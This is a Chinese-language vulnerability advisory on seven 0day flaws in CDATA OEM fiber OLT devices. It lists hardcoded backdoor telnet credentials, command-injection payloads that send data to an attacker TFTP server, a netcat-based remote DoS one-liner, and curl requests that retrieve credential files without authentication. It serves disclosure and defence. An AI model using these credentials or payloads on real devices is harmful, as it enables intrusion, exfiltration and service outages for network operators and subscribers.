## ******漏洞背景******  

2020年7月7日,研究人员Pierre披露了CDATA OLT中存在的多个0day漏洞，对产品的多个版本都有影响。这些漏洞的CVE暂未分配。

CDATA OLT是OEM FTTH OLT，涉及Cdata、OptiLink、V-SOL CN和BLIY等品牌。一些设备支持多个10 Gb上行链路，并提供多达1024个ONT（客户端）的Internet连接。

  

## ******漏洞摘要******  

CDATA OLT中存在的7个0day漏洞：  

1.  使用telnet进行后门访问
    
2.  凭证信息泄漏和明文凭证（telnet）
    
3.  具有root特权的Escape Shell
    
4.  预认证远程DoS
    
5.  凭证信息泄漏和明文凭证（HTTP）
    
6.  弱加密算法
    
7.  管理界面不安全
    

  

## ******漏洞详情******  

**1、使用telnet进行后门访问**

  

利用条件：攻击者可以从WAN接口和FTTH LAN接口访问telnet服务

  

利用后门我们可以获得管理员CLI访问权限。不同的固件有不同的硬编码后门凭证。

参考的用户名及密码如下：  

以前的版本和旧的版本可以通过以下用户名和密码利用：

```
login: suma123
panger123
```

最新的新版本可能会被利用：

```
login: debug
debug124

root
root126

guest
[empty]
```

有了这些访问权限，攻击者就可以对产品进行配置  

```


$ telnet [ip]root
root126


```

## **2、凭证信息泄漏和明文凭证（telnet）**

  

利用条件：对于这一漏洞，我们假设攻击者已经有CLI访问权限（可以通过使用telnet的后门访问来实现）。

  

通过在CLI中运行以下命令可以提取管理员凭据：

```
epon# show system infor

PASSWORD_CLEAR_TEXT
```

  

**3、具有root特权的Escape Shell**

  

利用条件：对于这一漏洞，我们同样假设攻击者已经有CLI访问权限（可以通过使用telnet的Backdoor访问来实现）。

  

CLI中有命令注入功能，攻击者可以以root用户身份执行命令。

命令注入位于TFTP下载配置部分。

在我们的例子中，我们使用metasploit在192.168.1.101上启动TFTP服务器，并接收注入命令到该TFTP服务器中的结果：  

```

$ msfconsole -q -x 'use auxiliary/server/tftp; run'
```

在OLT上：

```


epon# system configurations download olt 192.168.1.101 "$(cat /proc/cpuinfo > /tmp/test && tftp 192.168.1.101 put /tmp/test test)"
```

在攻击者计算机上运行的TFTP服务器上，我们收到命令的输出cat /proc/cpuinfo：

```













$ cat /tmp/test
```

  

也可以使用嵌入式Web服务器来泄露信息：

在OLT上：

```

epon# system configurations download olt 192.168.1.101 "$(export > /opt/lighttpd/web/cgi/out.txt)"
```

在攻击者机器上：

```








$ curl http://ip/cgi/out.txt
```

所有的进程都以root的身份在设备中运行：

```


PID   USER     COMMAND0        sh -c tftp 192.168.1.101 get $(ps a > /tmp/test && tftp 192.168.1.101 put /tmp/test test) /tmp/cfg_download.tar.gz
0        sh -c tftp 192.168.1.101 get $(ps a > /tmp/test && tftp 192.168.1.101 put /tmp/test test) /tmp/cfg_download.tar.gz

```

  

**4、预身份验证远程DoS**

  

利用条件：Telnet服务器正在设备中运行，并且可以从WAN接口和FTTH LAN接口访问。  

  

使用以下命令从该供应商重新启动任何OLT：

```

$ for i in $(seq 1 10); do cat /dev/urandom | nc 192.168.1.100 23 | hexdump -C;done
```

设备将在接下来的5秒钟内重启。

  

**5、凭证信息泄漏和明文凭证（HTTP）**

  

利用条件：Web服务器正在设备中运行，并且可以从WAN接口和FTTH LAN接口访问。  

  

未经身份验证，攻击者可以通过下载以下文件来提取Web配置，Telnet凭证和SNMP社区字符串（读写）：

```






/opt/lighttpd/web/cgi/snmp_read.txt
```

使用curl：

```





$ curl http://ip/cgi/snmp_read.txt
```

  

**6、弱加密算法**

**7、不安全的管理界面**

  

默认情况下，只能使用HTTP，telnet和SNMP远程管理设备。它不支持HTTP或SSH的SSL / TLS。攻击者可以拦截以明文形式发送的密码，并可以通过中间人攻击（MITM）来劫持设备。。
